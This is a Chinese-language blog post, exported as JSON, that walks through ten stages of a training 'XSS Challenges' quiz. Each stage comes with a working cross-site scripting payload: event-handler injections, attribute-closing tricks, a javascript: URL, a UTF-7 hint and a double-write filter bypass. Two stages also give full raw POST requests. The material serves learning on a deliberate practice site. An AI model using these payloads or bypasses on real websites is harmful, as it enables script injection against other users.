{"title":"XSS Challenges","uid":"7fcba27f174cb492cad0a42b50923924","slug":"XSS Challenges","date":"2021-08-15T10:49:36.000Z","updated":"2023-10-12T01:48:17.288Z","comments":true,"path":"api/articles/XSS Challenges.json","keywords":null,"cover":"https://cover.png","content":"<h1 id=\"XSS-Challenges\"><a href=\"#XSS-Challenges\" class=\"headerlink\" title=\"XSS Challenges\"></a>XSS Challenges</h1><h2 id=\"Stage-1\"><a href=\"#Stage-1\" class=\"headerlink\" title=\"Stage #1\"></a>Stage #1</h2><p>发现没有任何过滤，并且不需要任何闭合</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">img src=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">#</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> onerror=alert</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">document.domain</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> /</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><h2 id=\"Stage-2\"><a href=\"#Stage-2\" class=\"headerlink\" title=\"Stage #2\"></a>Stage #2</h2><p>查看源码发现需要闭合输入框的HTML标签</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;</span></span></code></pre></div><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage #3\"></a>Stage #3</h2><p>尝试闭合发现也没有反应，查看源码发现搜索框已经做了转移处理，并且发现是一个POST请求，后面的Choose a country没有转移处理，将此作为注入点。</p>\n<p>通过POST插入</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">POST</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/stage-3.php?sid=</span><span style=\"color: #F78C6C\">56552</span><span style=\"color: #C3E88D\">ee93b02c991d229f72f3e6c36c43d5e91b3</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">HTTP/1.1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Host:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xss-quiz.int21h.jp</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Cookie:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">PHPSESSID=</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">b5vrk9b5ra4pl60nl7kmueu0t</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utma</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.1469267736</span><span style=\"color: #C3E88D\">.1682478672.1682478672.1682478672.1</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmc</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmz</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.1682478672</span><span style=\"color: #C3E88D\">.1.1.utmcsr=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">direct</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #C3E88D\">utmccn=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">direct</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #C3E88D\">utmcmd=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">none</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmt</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmb</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.2</span><span style=\"color: #C3E88D\">.10.1682478672</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Content-Length:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">61</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Cache-Control:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">max-age=</span><span style=\"color: #F78C6C\">0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Not:A-Brand</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">99</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">&quot;Chromium&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">112</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua-Mobile:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">?0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua-Platform:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Windows</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Upgrade-Insecure-Requests:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Origin:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">https://xss-quiz.int21h.jp</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Content-Type:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">application/x-www-form-urlencoded</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">User-Agent:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Mozilla/5.0</span><span style=\"color: #BABED8\"> (Windows </span><span style=\"color: #C3E88D\">NT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">10.0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Win64</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">x64</span><span style=\"color: #BABED8\">) AppleWebKit/537.36 </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">KHTML,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">like</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Gecko</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> Chrome/112.0.5615.50 Safari/537.36</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">text/html,application/xhtml+xml,application/xml</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.9</span><span style=\"color: #C3E88D\">,image/avif,image/webp,image/apng,</span><span style=\"color: #BABED8\">*</span><span style=\"color: #C3E88D\">/</span><span style=\"color: #BABED8\">*</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.8</span><span style=\"color: #C3E88D\">,application/signed-exchange</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">b3</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.7</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Site:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">same-origin</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Mode:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">navigate</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-User:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">?1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Dest:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">document</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Referer:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">https://xss-quiz.int21h.jp/stage-3.php?sid=</span><span style=\"color: #F78C6C\">1946</span><span style=\"color: #C3E88D\">a40f2fb5b91a1f66b57c53948f60e033111f</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept-Encoding:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">gzip,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">deflate</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept-Language:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">zh-CN,zh</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.9</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Connection:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">close</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p1</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">123</span><span style=\"color: #89DDFF\">&amp;</span><span style=\"color: #BABED8\">p2</span><span style=\"color: #89DDFF\">=&lt;</span><span style=\"color: #C3E88D\">img</span><span style=\"color: #BABED8\"> src</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">#</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> onerror</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">alert</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">document.domain</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">/&gt;Japan</span></span></code></pre></div><h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage #4\"></a>Stage #4</h2><p>查看源码，发现有一个隐藏的字段</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">input type=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">hidden</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> name=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">p3</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> value=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">hackme</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p>使用burp插入xss语句，注意闭合。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">POST</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/stage_4.php?sid=a681339d09976811649b42466437ed3771cb3fcb</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">HTTP/1.1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Host:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xss-quiz.int21h.jp</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Cookie:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">PHPSESSID=</span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">b5vrk9b5ra4pl60nl7kmueu0t</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utma</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.1469267736</span><span style=\"color: #C3E88D\">.1682478672.1682478672.1682478672.1</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmc</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmz</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.1682478672</span><span style=\"color: #C3E88D\">.1.1.utmcsr=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">direct</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #C3E88D\">utmccn=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">direct</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">|</span><span style=\"color: #C3E88D\">utmcmd=</span><span style=\"color: #BABED8\">(</span><span style=\"color: #C3E88D\">none</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmt</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> __utmb</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">251560719.7</span><span style=\"color: #C3E88D\">.10.1682478672</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Content-Length:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">19</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Cache-Control:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">max-age=</span><span style=\"color: #F78C6C\">0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Not:A-Brand</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">99</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">&quot;Chromium&quot;</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">112</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua-Mobile:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">?0</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Ch-Ua-Platform:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Windows</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Upgrade-Insecure-Requests:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Origin:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">https://xss-quiz.int21h.jp</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Content-Type:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">application/x-www-form-urlencoded</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">User-Agent:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Mozilla/5.0</span><span style=\"color: #BABED8\"> (Windows </span><span style=\"color: #C3E88D\">NT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">10.0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Win64</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">x64</span><span style=\"color: #BABED8\">) AppleWebKit/537.36 </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">KHTML,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">like</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Gecko</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> Chrome/112.0.5615.50 Safari/537.36</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">text/html,application/xhtml+xml,application/xml</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.9</span><span style=\"color: #C3E88D\">,image/avif,image/webp,image/apng,</span><span style=\"color: #BABED8\">*</span><span style=\"color: #C3E88D\">/</span><span style=\"color: #BABED8\">*</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.8</span><span style=\"color: #C3E88D\">,application/signed-exchange</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">v</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">b3</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.7</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Site:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">same-origin</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Mode:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">navigate</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-User:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">?1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Sec-Fetch-Dest:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">document</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Referer:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">https://xss-quiz.int21h.jp/stage_4.php?sid=aca950e4dd9081e0241f323c567bb8b3ac3824e7</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept-Encoding:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">gzip,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">deflate</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Accept-Language:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">zh-CN,zh</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\">q</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">0.9</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Connection:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">close</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">p1</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">123</span><span style=\"color: #89DDFF\">&amp;</span><span style=\"color: #BABED8\">p2</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">Japan</span><span style=\"color: #89DDFF\">&amp;</span><span style=\"color: #BABED8\">p3</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;</span><span style=\"color: #89DDFF\">&quot;</span></span></code></pre></div><h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage #5\"></a>Stage #5</h2><p>发现限制了输入长度并且为value标签，所以需要修改长度并闭合value</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;</span></span></code></pre></div><h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage #6\"></a>Stage #6</h2><p>发现与第二关类似，但是使用第二关exp打不通，发现&lt;&gt;被过滤，可以使用”闭合。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot; onmouseover=alert(document.domain) name=&quot;</span><span style=\"color: #FFCB6B\">1</span></span></code></pre></div><p>onmouseover是鼠标移到上面就会触发的事件</p>\n<h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage #7\"></a>Stage #7</h2><p>跟第六关一样过滤&lt;&gt;，但是同时发现”也被过滤，无法用”分隔属性，但是可以用空格分隔。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot; onclick=alert(document.domain)　　</span></span></code></pre></div><h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage #8\"></a>Stage #8</h2><p>观察题目要求让我们在url中运行javascript。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">javascript:alert(document.domain</span><span style=\"color: #BABED8\">)</span></span></code></pre></div><p>插入了一个url，点击即可弹窗。</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage #9\"></a>Stage #9</h2><p>根据hint我们发现使用的utf-7。</p>\n<p>直接修改元素</p>\n<p>改为第二关的exp即可</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;</span></span></code></pre></div><h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage #10\"></a>Stage #10</h2><p>经过测试，发现domain被过滤了，可以直接双写绕过。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.dodomainmain) /&gt;&lt;&quot;</span></span></code></pre></div>","feature":true,"text":"XSS ChallengesStage #1发现没有任何过滤，并且不需要任何闭合 shell&lt;img src=&#39;#&#39; onerror=al...","permalink":"/post/XSS Challenges","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#XSS-Challenges\"><span class=\"toc-text\">XSS Challenges</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-1\"><span class=\"toc-text\">Stage #1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-2\"><span class=\"toc-text\">Stage #2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-3\"><span class=\"toc-text\">Stage #3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-4\"><span class=\"toc-text\">Stage #4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-5\"><span class=\"toc-text\">Stage #5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-6\"><span class=\"toc-text\">Stage #6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-7\"><span class=\"toc-text\">Stage #7</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-8\"><span class=\"toc-text\">Stage #8</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-9\"><span class=\"toc-text\">Stage #9</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Stage-10\"><span class=\"toc-text\">Stage #10</span></a></li></ol></li></ol>","author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"PWN的基本ROP链构造","uid":"20032183053bd6117641c219a5d520bb","slug":"PWN的基本ROP链构造","date":"2022-05-15T10:49:36.000Z","updated":"2023-10-12T01:46:59.813Z","comments":true,"path":"api/articles/PWN的基本ROP链构造.json","keywords":null,"cover":"https://cover.png","text":"查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个...","permalink":"/post/PWN的基本ROP链构造","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"PWN","slug":"PWN","count":1,"path":"api/tags/PWN.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true},"next_post":{}}